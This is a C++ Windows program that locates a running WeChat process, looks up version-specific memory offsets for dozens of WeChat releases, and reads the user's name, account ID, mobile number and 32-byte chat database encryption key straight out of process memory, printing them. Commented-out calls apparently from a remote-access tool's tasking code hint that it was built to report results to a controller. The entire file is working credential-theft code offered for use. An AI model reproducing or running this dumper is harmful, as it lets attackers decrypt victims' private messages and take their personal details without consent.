

#include<cstdio>
#include<Windows.h>
#include<string>

#include <tlhelp32.h>
#include<psapi.h>

#pragma comment(lib, "version.lib")
using namespace std;
void WebChatKeyDump() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	char buffer[32];
	char version[9];
	char szPath[MAX_PATH];
	DWORD WeChatWinDllBase = NULL;
	DWORD WeChatNameOffset = NULL;
	DWORD WeChatMobileOffset = NULL;
	DWORD WeChatKeyOffset = NULL;
	DWORD WeChatAccountOffset = NULL;
	memset(buffer, 0, sizeof buffer);
	memset(version, 0, sizeof version);
	char szAppFullPath[_MAX_PATH] = { 0 };
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
		if (strcmp(pe.szExeFile, "WeChat.exe") == 0) {
			CloseHandle(hSnapshot);
			printf("ProcessId:%d\n", pe.th32ProcessID);
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);


			HMODULE hMod = NULL;
			DWORD cb = 0;
			if (EnumProcessModules((HANDLE)hProcess, &hMod, sizeof(hMod), &cb))
			{
				//dwRet = GetModuleFileName(hMod, szPath, MAX_PATH);
				DWORD dwRet = GetModuleFileNameEx(hProcess, hMod, szPath, MAX_PATH);
				if (dwRet == 0)
				{

					CloseHandle(hProcess);
				}
				else {
					DWORD dwLen = GetFileVersionInfoSize(szPath, NULL);

					char* pszAppVersion = new char[dwLen + 1];
					if (pszAppVersion)
					{
						memset(pszAppVersion, 0, sizeof(char) * (dwLen + 1));
						GetFileVersionInfoA(szPath, NULL, dwLen, pszAppVersion);
						UINT nLen(0);
						VS_FIXEDFILEINFO* pFileInfo(NULL);
						VerQueryValueA(pszAppVersion, "\\", (LPVOID*)&pFileInfo, &nLen);

						if (pFileInfo)
						{
							sprintf_s(buffer, "%d.%d.%d.%d", HIWORD(pFileInfo->dwFileVersionMS), LOWORD(pFileInfo->dwFileVersionMS), HIWORD(pFileInfo->dwFileVersionLS), LOWORD(pFileInfo->dwFileVersionLS));
							memcpy(version, buffer, 8);
							if (strcmp("3.9.0.28", version) == 0) {
								WeChatNameOffset = 48418376;
								WeChatAccountOffset = 48419280;
								WeChatMobileOffset = 48418232;
								WeChatKeyOffset = 48419244;

								printf("It's WeChat 3.9.0.28\n");

							}

							else if (strcmp("3.2.1.154", version) == 0) {
								WeChatNameOffset = 328121948;
								WeChatAccountOffset = 328122328;
								WeChatMobileOffset = 328123056;
								WeChatKeyOffset = 328123020;
								printf("It's WeChat 3.2.1.154\n");
							}


							else if (strcmp("3.3.0.115", version) == 0) {
								WeChatNameOffset = 31323364;
								WeChatAccountOffset = 31323744;
								WeChatMobileOffset = 31324472;
								WeChatKeyOffset = 31324436;
								printf("It's WeChat 3.3.0.115\n");
							}


							else if (strcmp("3.3.0.84", version) == 0) {
								WeChatNameOffset = 31315212;
								WeChatAccountOffset = 31315592;
								WeChatMobileOffset = 31316320;
								WeChatKeyOffset = 31316284;
								printf("It's WeChat 3.3.0.84\n");
							}


							else if (strcmp("3.3.0.93", version) == 0) {
								WeChatNameOffset = 31323364;
								WeChatAccountOffset = 31323744;
								WeChatMobileOffset = 31324472;
								WeChatKeyOffset = 31324436;
								printf("It's WeChat 3.3.0.93\n");
							}


							else if (strcmp("3.3.5.34", version) == 0) {
								WeChatNameOffset = 30603028;
								WeChatAccountOffset = 30603408;
								WeChatMobileOffset = 30604120;
								WeChatKeyOffset = 30604100;
								printf("It's WeChat 3.3.5.34\n");
							}


							else if (strcmp("3.3.5.42", version) == 0) {
								WeChatNameOffset = 30603012;
								WeChatAccountOffset = 30603392;
								WeChatMobileOffset = 30604120;
								WeChatKeyOffset = 30604084;
								printf("It's WeChat 3.3.5.42\n");
							}


							else if (strcmp("3.3.5.46", version) == 0) {
								WeChatNameOffset = 30578372;
								WeChatAccountOffset = 30578752;
								WeChatMobileOffset = 30579480;
								WeChatKeyOffset = 30579444;
								printf("It's WeChat 3.3.5.46\n");
							}


							else if (strcmp("3.4.0.37", version) == 0) {
								WeChatNameOffset = 31608116;
								WeChatAccountOffset = 31608496;
								WeChatMobileOffset = 31609224;
								WeChatKeyOffset = 31609188;
								printf("It's WeChat 3.4.0.37\n");
							}


							else if (strcmp("3.4.0.38", version) == 0) {
								WeChatNameOffset = 31604044;
								WeChatAccountOffset = 31604424;
								WeChatMobileOffset = 31605152;
								WeChatKeyOffset = 31605116;
								printf("It's WeChat 3.4.0.38\n");
							}


							else if (strcmp("3.4.0.50", version) == 0) {
								WeChatNameOffset = 31688500;
								WeChatAccountOffset = 31688880;
								WeChatMobileOffset = 31689608;
								WeChatKeyOffset = 31689572;
								printf("It's WeChat 3.4.0.50\n");
							}


							else if (strcmp("3.4.0.54", version) == 0) {
								WeChatNameOffset = 31700852;
								WeChatAccountOffset = 31701248;
								WeChatMobileOffset = 31700920;
								WeChatKeyOffset = 31701924;
								printf("It's WeChat 3.4.0.54\n");
							}


							else if (strcmp("3.4.5.27", version) == 0) {
								WeChatNameOffset = 32133788;
								WeChatAccountOffset = 32134168;
								WeChatMobileOffset = 32134896;
								WeChatKeyOffset = 32134860;
								printf("It's WeChat 3.4.5.27\n");
							}


							else if (strcmp("3.4.5.45", version) == 0) {
								WeChatNameOffset = 32147012;
								WeChatAccountOffset = 32147392;
								WeChatMobileOffset = 32147064;
								WeChatKeyOffset = 32148084;
								printf("It's WeChat 3.4.5.45\n");
							}


							else if (strcmp("3.5.0.20", version) == 0) {
								WeChatNameOffset = 35494484;
								WeChatAccountOffset = 35494864;
								WeChatMobileOffset = 35494536;
								WeChatKeyOffset = 35495556;
								printf("It's WeChat 3.5.0.20\n");
							}


							else if (strcmp("3.5.0.29", version) == 0) {
								WeChatNameOffset = 35507980;
								WeChatAccountOffset = 35508360;
								WeChatMobileOffset = 35508032;
								WeChatKeyOffset = 35509052;
								printf("It's WeChat 3.5.0.29\n");
							}


							else if (strcmp("3.5.0.33", version) == 0) {
								WeChatNameOffset = 35512140;
								WeChatAccountOffset = 35512520;
								WeChatMobileOffset = 35512192;
								WeChatKeyOffset = 35513212;
								printf("It's WeChat 3.5.0.33\n");
							}


							else if (strcmp("3.5.0.39", version) == 0) {
								WeChatNameOffset = 35516236;
								WeChatAccountOffset = 35516616;
								WeChatMobileOffset = 35516288;
								WeChatKeyOffset = 35517308;
								printf("It's WeChat 3.5.0.39\n");
							}


							else if (strcmp("3.5.0.42", version) == 0) {
								WeChatNameOffset = 35512140;
								WeChatAccountOffset = 35512520;
								WeChatMobileOffset = 35512192;
								WeChatKeyOffset = 35513212;
								printf("It's WeChat 3.5.0.42\n");
							}


							else if (strcmp("3.5.0.44", version) == 0) {
								WeChatNameOffset = 35510836;
								WeChatAccountOffset = 35511216;
								WeChatMobileOffset = 35510896;
								WeChatKeyOffset = 35511908;
								printf("It's WeChat 3.5.0.44\n");
							}


							else if (strcmp("3.5.0.46", version) == 0) {
								WeChatNameOffset = 35506740;
								WeChatAccountOffset = 35507120;
								WeChatMobileOffset = 35506800;
								WeChatKeyOffset = 35507812;
								printf("It's WeChat 3.5.0.46\n");
							}


							else if (strcmp("3.6.0.18", version) == 0) {
								WeChatNameOffset = 35842996;
								WeChatAccountOffset = 35843376;
								WeChatMobileOffset = 35843048;
								WeChatKeyOffset = 35844068;
								printf("It's WeChat 3.6.0.18\n");
							}


							else if (strcmp("3.6.5.7", version) == 0) {
								WeChatNameOffset = 35864356;
								WeChatAccountOffset = 35864736;
								WeChatMobileOffset = 35864408;
								WeChatKeyOffset = 35865428;
								printf("It's WeChat 3.6.5.7\n");
							}


							else if (strcmp("3.6.5.16", version) == 0) {
								WeChatNameOffset = 35909428;
								WeChatAccountOffset = 35909808;
								WeChatMobileOffset = 35909480;
								WeChatKeyOffset = 35910500;
								printf("It's WeChat 3.6.5.16\n");
							}


							else if (strcmp("3.7.0.26", version) == 0) {
								WeChatNameOffset = 37105908;
								WeChatAccountOffset = 37106288;
								WeChatMobileOffset = 37105960;
								WeChatKeyOffset = 37106980;
								printf("It's WeChat 3.7.0.26\n");
							}


							else if (strcmp("3.7.0.29", version) == 0) {
								WeChatNameOffset = 37105908;
								WeChatAccountOffset = 37106288;
								WeChatMobileOffset = 37105960;
								WeChatKeyOffset = 37106980;
								printf("It's WeChat 3.7.0.29\n");
							}


							else if (strcmp("3.7.0.30", version) == 0) {
								WeChatNameOffset = 37118196;
								WeChatAccountOffset = 37118576;
								WeChatMobileOffset = 37118248;
								WeChatKeyOffset = 37119268;
								printf("It's WeChat 3.7.0.30\n");
							}


							else if (strcmp("3.7.5.11", version) == 0) {
								WeChatNameOffset = 37883280;
								WeChatAccountOffset = 37884088;
								WeChatMobileOffset = 37883136;
								WeChatKeyOffset = 37884052;
								printf("It's WeChat 3.7.5.11\n");
							}


							else if (strcmp("3.7.5.23", version) == 0) {
								WeChatNameOffset = 37895736;
								WeChatAccountOffset = 37896544;
								WeChatMobileOffset = 37895592;
								WeChatKeyOffset = 37896508;
								printf("It's WeChat 3.7.5.23\n");
							}


							else if (strcmp("3.7.5.27", version) == 0) {
								WeChatNameOffset = 37895736;
								WeChatAccountOffset = 37896544;
								WeChatMobileOffset = 37895592;
								WeChatKeyOffset = 37896508;
								printf("It's WeChat 3.7.5.27\n");
							}


							else if (strcmp("3.7.5.31", version) == 0) {
								WeChatNameOffset = 37903928;
								WeChatAccountOffset = 37904736;
								WeChatMobileOffset = 37903784;
								WeChatKeyOffset = 37904700;
								printf("It's WeChat 3.7.5.31\n");
							}


							else if (strcmp("3.7.6.24", version) == 0) {
								WeChatNameOffset = 38978840;
								WeChatAccountOffset = 38979648;
								WeChatMobileOffset = 38978696;
								WeChatKeyOffset = 38979612;
								printf("It's WeChat 3.7.6.24\n");
							}


							else if (strcmp("3.7.6.29", version) == 0) {
								WeChatNameOffset = 38986376;
								WeChatAccountOffset = 38987184;
								WeChatMobileOffset = 38986232;
								WeChatKeyOffset = 38987148;
								printf("It's WeChat 3.7.6.29\n");
							}


							else if (strcmp("3.7.6.44", version) == 0) {
								WeChatNameOffset = 39016520;
								WeChatAccountOffset = 39017328;
								WeChatMobileOffset = 39016376;
								WeChatKeyOffset = 39017292;
								printf("It's WeChat 3.7.6.44\n");
							}


							else if (strcmp("3.8.0.31", version) == 0) {
								WeChatNameOffset = 46064088;
								WeChatAccountOffset = 46064912;
								WeChatMobileOffset = 46063944;
								WeChatKeyOffset = 46064876;
								printf("It's WeChat 3.8.0.31\n");
							}


							else if (strcmp("3.8.0.33", version) == 0) {
								WeChatNameOffset = 46059992;
								WeChatAccountOffset = 46060816;
								WeChatMobileOffset = 46059848;
								WeChatKeyOffset = 46060780;
								printf("It's WeChat 3.8.0.33\n");
							}


							else if (strcmp("3.8.0.41", version) == 0) {
								WeChatNameOffset = 46064024;
								WeChatAccountOffset = 46064848;
								WeChatMobileOffset = 46063880;
								WeChatKeyOffset = 46064812;
								printf("It's WeChat 3.8.0.41\n");
							}


							else if (strcmp("3.8.1.26", version) == 0) {
								WeChatNameOffset = 46409448;
								WeChatAccountOffset = 46410272;
								WeChatMobileOffset = 46409304;
								WeChatKeyOffset = 46410236;
								printf("It's WeChat 3.8.1.26\n");
							}


							else if (strcmp("3.9.0.28", version) == 0) {
								WeChatNameOffset = 48418376;
								WeChatAccountOffset = 48419280;
								WeChatMobileOffset = 48418232;
								WeChatKeyOffset = 48419244;
								printf("It's WeChat 3.9.0.28\n");
							}
							else {
								string msg = "The WeChat version does not support key acquisition version:";
								msg = msg + version;
								//Request(25, RecvData->UUID, RecvData->TASKUUID, msg.length(), 1, (char*)msg.c_str(), NULL);

								continue;
							}

							HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE32 | TH32CS_SNAPMODULE, pe.th32ProcessID);
							MODULEENTRY32 mi;
							mi.dwSize = sizeof(MODULEENTRY32);
							BOOL bRet = Module32First(hModuleSnap, &mi);
							while (bRet)
							{
								if (strcmp("WeChatWin.dll", mi.szModule) == 0) {
									WeChatWinDllBase = (DWORD)mi.modBaseAddr;
									char namebuffer[127];
									char accoutbuffer[127];
									char wechatmobile[127];
									char webchatkey[33];
									char KeyAddress[4];
									char KeyHexBuffer[64 + 1];

									memset(KeyHexBuffer, 0, sizeof KeyHexBuffer);
									memset(webchatkey, 0, sizeof webchatkey);
									memset(namebuffer, 0, sizeof namebuffer);
									memset(KeyAddress, 0, sizeof(KeyAddress));
									SIZE_T nSize = 127;
									CloseHandle(hProcess);
									hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);

									BOOL nRead = ReadProcessMemory(hProcess, (LPCVOID)(mi.modBaseAddr + WeChatNameOffset), namebuffer, 127, &nSize);
									if (!nRead) {
										string msg = "Read WeChat Process Memory Error";

									return;
									}
									nRead = ReadProcessMemory(hProcess, (LPCVOID)(mi.modBaseAddr + WeChatAccountOffset), accoutbuffer, 127, &nSize);

									nRead = ReadProcessMemory(hProcess, (LPCVOID)(mi.modBaseAddr + WeChatMobileOffset), wechatmobile, 127, &nSize);

									nRead = ReadProcessMemory(hProcess, (LPCVOID)(mi.modBaseAddr + WeChatKeyOffset), KeyAddress, 5, &nSize);
									DWORD lpBaseAddress2 = (DWORD)(((DWORD)KeyAddress[3] << 24) + ((DWORD)KeyAddress[2] << 16) + (((short int)KeyAddress[1] << 8) & 0xffff) + (unsigned char)KeyAddress[0]);

									nRead = ReadProcessMemory(hProcess, (LPVOID)lpBaseAddress2, webchatkey, 32, &nSize);
									//AsciiToHex(webchatkey, KeyHexBuffer,32);
									if (nRead) {
										DWORD nSize = 0;
										printf("Name:%s\n", namebuffer);
										printf("Accout:%s\n", accoutbuffer);
										printf("Mobile:%s\n", wechatmobile);
										printf("WeChat Key:");
										for (unsigned char d : webchatkey) {
											printf("%x", d);
										}
			
										//Request(25, RecvData->UUID, RecvData->TASKUUID, sendbuffersize, 0, sendbuffer, NULL);

									}
									else {
										printf("ReadFailed\n");
										break;
									}
								}
								bRet = Module32Next(hModuleSnap, &mi);
							}
							CloseHandle(hModuleSnap);
						}
					}

				}



			}
			CloseHandle(hProcess);
		}
		//printf("%-6d %s\n", pe.th32ProcessID, pe.szExeFile);
	}
	string msg = "No process detected on WeChat.exe";

	//Request(25, RecvData->UUID, RecvData->TASKUUID, msg.length(), 1, (char*)msg.c_str(), NULL);
	return;
}


int main() { WebChatKeyDump(); }